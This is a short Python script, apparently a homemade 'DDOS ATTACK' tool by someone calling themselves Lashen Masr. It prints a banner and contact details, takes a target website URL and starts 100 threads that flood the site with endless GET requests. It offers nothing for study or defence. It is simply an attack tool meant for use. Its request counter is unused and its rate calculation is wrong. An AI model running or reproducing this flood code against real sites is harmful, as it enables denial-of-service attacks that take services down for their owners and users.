from termcolor import colored
import pyfiglet
import requests
import threading
import time

text = "LASHEN  MASR"
big_text = pyfiglet.figlet_format(text, font="big")
blue_big_text = colored(big_text, "blue")

print(blue_big_text)

text = "Made By Lashen"
yellow_text = colored(text, "yellow")

print(yellow_text.ljust(30))

text = "whatsap : +201508327066"
yellow_text = colored(text, "yellow")

print(yellow_text.ljust(30))
text = "telegram : @lashenmasrr"
yellow_text = colored(text, "yellow")

print(yellow_text.ljust(30))
text = "Facebook : Lashen Android"
yellow_text = colored(text, "yellow")

print(yellow_text.ljust(30))

text = "Instagram : lashen.masr"
yellow_text = colored(text, "yellow")

print(yellow_text.ljust(30))
text = "Gmail : lashenmasrr@gmail.com"
yellow_text = colored(text, "yellow")

print(yellow_text.ljust(30))
print("--------------------------------------------")



url = input("Enter website URL: ")
num_requests = int(input("Enter number of DDOS ATTACK: "))
num_threads = 100

def send_request():
    while True:
        response = requests.get(url)
        if response.status_code == 200:
          text = "A powerful attack was sent by Lashen Masr"
          red_text = colored(text, "red")   
          print(red_text.ljust(30))

threads = []
start_time = time.time()
for i in range(num_threads):
    t = threading.Thread(target=send_request)
    threads.append(t)
    t.start()
    
for t in threads:
    t.join()

end_time = time.time()
total_time = end_time - start_time
requests_per_second = num_threads / total_time
print(f"{requests_per_second} requests per second")

